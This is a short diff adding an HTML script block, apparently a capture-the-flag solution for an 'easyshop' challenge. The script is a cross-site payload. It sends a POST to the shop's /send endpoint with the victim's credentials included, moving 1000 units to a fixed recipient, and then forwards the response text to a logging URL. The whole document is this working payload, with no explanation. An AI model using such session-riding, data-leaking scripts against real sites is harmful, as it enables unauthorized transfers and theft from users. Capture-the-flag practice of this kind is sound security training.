@@ -1,0 +1,12 @@
+<script>
+    fetch("https://easyshop.challs.olicyber.it/send", {
+        credentials: "include",
+        method: "POST",
+        body : new URLSearchParams({
+            "to":"296dcaa9c55c67a1d42d64527045bcad261a7060ce102274e695d9c53d6b1043",
+            "amount":"1000"
+        })
+    }).then((response) => response.text())
+        .then((text) => fetch('127.0.0.1/?log=' + text))
+
+</script>  
